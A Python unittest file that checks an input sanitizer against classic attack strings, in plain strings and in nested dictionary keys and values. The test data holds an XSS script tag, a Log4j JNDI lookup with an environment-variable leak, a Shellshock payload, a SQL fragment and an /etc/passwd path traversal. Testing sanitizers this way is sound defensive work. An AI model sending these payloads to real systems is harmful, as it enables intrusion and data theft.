import unittest
import xmlrunner
import sys
sys.path.append('.')
from standard_input_sanitizer import *

class TestSanitizeUnicodeAllowed(unittest.TestCase):

    def test_html_encoding(self):
        self.assertEqual(
            sanitize_input('<script>alert(1)</script>'),
            '&lt;script&gt;alert(1)&lt;/script&gt;'
        )

    def test_log4j_payload(self):
        self.assertEqual(
            sanitize_input('${jndi:ldap://example.com/a}${env:USER}'),
            ''
        )

    def test_shellshock_payload(self):
        self.assertEqual(
            sanitize_input('() { :;}; echo shellshocked'),
            'echo shellshocked'
        )

    def test_sql_injection(self):
        self.assertEqual(
            sanitize_input("SELECT * FROM users WHERE user = 'admin'"),
            " FROM users WHERE user = 'admin'"
        )

    def test_path_traversal(self):
        self.assertEqual(
            sanitize_input("../../etc/passwd"),
            "etc/passwd"
        )

    def test_unprinted_characters(self):
        self.assertEqual(
            sanitize_input("Text with unprinted character\x01 here"),
            "Text with unprinted character here"
        )

    def test_unprinted_characters2(self):
        self.assertEqual(
            sanitize_input("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x7f"),
            ""
        )

    def test_unicode_characters(self):
        self.assertEqual(
            sanitize_input("Unicode test: Привет мир"),
            "Unicode test: Привет мир"
        )

    def test_unicode_characters2(self):
        self.assertEqual(
            sanitize_input("select ' from ☃"),
            " from ☃"
        )

    def test_newlines_and_tabs(self):
        self.assertEqual(
            sanitize_input("Newline\n and tab\t characters"),
            "Newline\n and tab\t characters"
        )

    def test_nested_structures(self):
        nested_input = {
            "key1": "<script>alert(1)</script>${jndi:ldap://example.com/a}",
            "key2": ["<List>", "() { :;}; echo shellshocked", {"nested_key": "<Nested>"}],
            "key3": "Text with unprinted character\x01 here",
            "key4": "SELECT * FROM users WHERE user = 'admin'",
            "key5": "Important file location: ../../etc/passwd",
            "key6": "Newline\n and tab\t characters",
            "key7": "Unicode test: Привет мир"
        }
        expected_output = {
            'key1': '&lt;script&gt;alert(1)&lt;/script&gt;',
            'key2': ['&lt;List&gt;', 'echo shellshocked', {'nested_key': '&lt;Nested&gt;'}],
            'key3': 'Text with unprinted character here',
            'key4': " FROM users WHERE user = 'admin'",
            'key5': 'Important file location: etc/passwd',
            'key6': 'Newline\n and tab\t characters',
            'key7': 'Unicode test: Привет мир'
        }
        self.assertEqual(sanitize_input(nested_input), expected_output)

    def test_filter_keys(self):
        nested_input = {
            "<script>alert(1)</script>${jndi:ldap://example.com/a}": "value1",
            "<List>() { :;}; echo shellshocked": "value2",
            "Text with unprinted character\x01 here": "value3",
            "SELECT * FROM users WHERE user = 'admin'": "value4",
            "Important file location: ../../etc/passwd": "value5",
            "Newline\n and tab\t characters": "value6",
            "Unicode test: Привет мир": "value7",
        }
        expected_output = {
            '&lt;script&gt;alert(1)&lt;/script&gt;': 'value1',
            '&lt;List&gt;echo shellshocked': 'value2',
            'Text with unprinted character here': 'value3',
            " FROM users WHERE user = 'admin'": 'value4',
            'Important file location: etc/passwd': 'value5',
            'Newline\n and tab\t characters': 'value6',
            'Unicode test: Привет мир': 'value7',
        }
        self.assertEqual(sanitize_input(nested_input), expected_output)

# Running the tests
unittest.main(testRunner=xmlrunner.XMLTestRunner(output='xml-test-reports'))
